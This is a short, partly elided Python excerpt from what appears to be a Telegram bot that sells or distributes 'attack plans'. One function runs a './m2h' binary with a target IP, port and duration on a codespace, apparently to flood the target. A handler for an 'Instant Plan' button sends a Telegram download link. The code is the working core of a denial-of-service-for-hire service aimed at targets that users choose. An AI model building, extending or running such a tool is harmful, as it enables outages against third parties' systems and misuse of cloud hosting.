...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./m2h {target_ip} {target_port} {duration} 25"
    try:
...
def handle_message(message):
    ...
    if message.text == "Instant Plan 😇":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/c/1970210072/488*", parse_mode='Markdown')
